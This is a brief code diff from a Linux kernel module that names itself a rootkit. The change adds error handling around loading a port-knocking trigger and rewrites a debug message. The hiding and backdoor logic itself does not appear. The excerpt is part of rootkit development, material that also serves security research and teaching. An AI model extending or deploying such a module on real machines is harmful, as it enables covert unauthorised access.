@@ -38,9 +38,13 @@ int init_module (void)
 		return -EINVAL;
 	}
 	
-	load_port_knocking(input_ip, (unsigned)port_number);
+	ret = load_port_knocking(input_ip, (unsigned) port_number);
+	if(ret < 0) {
+		ROOTKIT_DEBUG("Error while loading port knocking");
+		return ret;
+	}
 	
-	ROOTKIT_DEBUG("Done.\n");
+	ROOTKIT_DEBUG("Sucessfully loaded the LKM!\n");
 	return 0;
 }
 
